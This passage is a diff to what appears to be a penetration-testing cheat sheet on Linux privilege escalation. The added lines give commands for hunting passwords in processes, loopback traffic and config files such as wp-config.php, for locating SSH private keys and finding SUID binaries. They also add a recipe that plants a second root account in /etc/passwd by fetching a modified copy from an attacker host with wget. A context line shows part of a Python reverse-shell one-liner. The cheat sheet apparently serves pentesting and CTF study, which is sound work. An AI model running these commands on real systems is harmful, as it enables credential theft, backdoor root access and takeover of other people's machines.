@@ -4059,6 +4059,17 @@ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREA
 - `history`
 - `cat ~/.profile`
 
+**Password disclosure**
+- `watch -n 1 "ps -aux | grep pass"`
+- `sudo tcpdump -i lo -A | grep "pass"`
+- search for passwords
+  - `grep -rnw . -ie password --color=always 2>/dev/null`
+  - `grep -rnw . -ie tom --color=always 2>/dev/null`
+  - `grep -rnw . -ie DB_PASSWORD --color=always 2>/dev/null`
+- check `wp-config.php` in:
+  - `/var/www/html`
+  - `/srv/http`
+
 #### <ins>SSH</ins>
 - `find / -maxdepth 5 -name .ssh -exec grep -rnw {} -e 'PRIVATE' \; 2> /dev/null` find SSH keys
 
@@ -4149,8 +4160,17 @@ Path traversal:
 #### <ins>SUID / SGID Executables</ins>
 
 **setuid + GTFOBins**
-- Check for setuid binaries on the machine `find / -perm -4000 -type f -exec ls -al {} \; 2>/dev/null`
+- Check for setuid binaries on the machine
+  - `find / -perm -4000 -type f -exec ls -al {} \; 2>/dev/null`
+  - `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
 - Use [GTFOBins](https://gtfobins.github.io/) to elevate your privileges
+
+**wget + setuid**
+- You can use it to add a root user
+  1. obtain `/etc/passwd` from the victim
+  2. add the new user `echo "root2:bWBoOyE1sFaiQ:0:0:root:/root:/bin/bash" >> passwd`
+     - password hash generated with `openssl passwd mypass`
+  3. overwrite `/etc/passwd` > `wget http://ATTACKERIP/passwd -o /etc/passwd`
 
 **Known Exploits**
 - Search for all the SUID/SGID executables on the Linux Machine `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
